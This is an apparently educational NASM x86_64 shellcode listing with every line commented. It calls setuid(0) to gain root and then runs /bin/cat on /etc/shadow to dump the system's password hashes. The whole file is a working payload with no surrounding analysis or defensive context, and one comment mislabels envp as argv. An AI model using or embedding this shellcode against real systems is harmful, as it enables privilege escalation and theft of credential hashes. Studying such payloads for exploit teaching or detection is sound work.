bits 64                         ; Tell NASM this is 64-bit x86 code
default rel                     ; Use RIP-relative addressing by default

global _start                   ; Export _start as the ELF entry point

section .text                   ; Code section starts here

_start:                         ; Program begins execution here

    xor     eax, eax            ; Clear RAX: rax = 0
                                ; Using eax zeroes the full rax register on x86_64

    xor     edi, edi            ; Clear RDI: rdi = 0
                                ; First syscall argument will be 0

    mov     al, 0x69            ; Put syscall number 105 into AL
                                ; 105 = setuid on Linux x86_64

    syscall                     ; Call setuid(0)
                                ; Attempts to set UID to root

    lea     rdi, [rel path]     ; RDI = pointer to "/bin/cat"
                                ; First arg to execve: filename

    lea     rsi, [rel argv]     ; RSI = pointer to argv array
                                ; Second arg to execve: argv

    xor     edx, edx            ; envp = NULL
                                ; Third arg to execve: argv = NULL

    push    0x3b                ; Push syscall number 59 onto the stack
                                ; 59 = execve on Linux x86_64

    pop     rax                 ; RAX = 59
                                ; Syscall number is now execve

    syscall                     ; Call execve("/bin/cat", argv, NULL)
                                ; If successful, this process becomes /bin/cat
                                ; Code below only runs if execve fails

    xor     edi, edi            ; RDI = 0
                                ; First arg to exit: status = 0

    push    0x3c                ; Push syscall number 60
                                ; 60 = exit on Linux x86_64

    pop     rax                 ; RAX = 60
                                ; Syscall number is now exit

    syscall                     ; Call exit(0)

path:                           ; String data lives directly after code
    db "/bin/cat", 0             ; Null-terminated string: "/bin/cat"

arg0:                           ; argv[0] string
    db "cat", 0                ; Program name conventionally passed as argv[0]

arg1:                           ; argv[1] string
    db "/etc/shadow", 0        ; Argument passed to /bin/cat

align 8                         ; Align following pointer table to 8 bytes
                                ; Pointers are 8 bytes on x86_64

argv:                           ; argv array starts here
    dq arg0                     ; argv[0] = pointer to "cat"
    dq arg1                     ; argv[1] = pointer to "/etc/shadow"
    dq 0                        ; argv[2] = NULL terminator
